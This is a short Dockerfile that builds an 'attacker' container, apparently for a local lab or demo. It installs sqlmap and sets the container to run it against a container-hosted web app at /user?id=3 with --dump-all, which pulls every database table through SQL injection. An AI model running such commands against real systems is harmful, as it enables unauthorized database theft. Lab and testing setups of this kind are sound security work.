FROM debian:latest

RUN apt update && \
    apt install -y sqlmap curl && \
    apt clean

WORKDIR /attacker
RUN apt update && apt install git -y
RUN git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
RUN ln -s $(which python3) $(dirname $(which python3))/python

# sqlmap -u "http://127.0.0.1:8000/user?id=3" --batch --dump-all
# CMD ["./sqlmap/sqlmap.py", "-u", "http://web:8000/user?id=3", "--batch", "--dump-all"]
CMD ["bash", "-c", "sleep 10 && ./sqlmap/sqlmap.py -u 'http://web:8000/user?id=3' --batch --dump-all &> ./output/sqlmap.out && sleep 1000"]
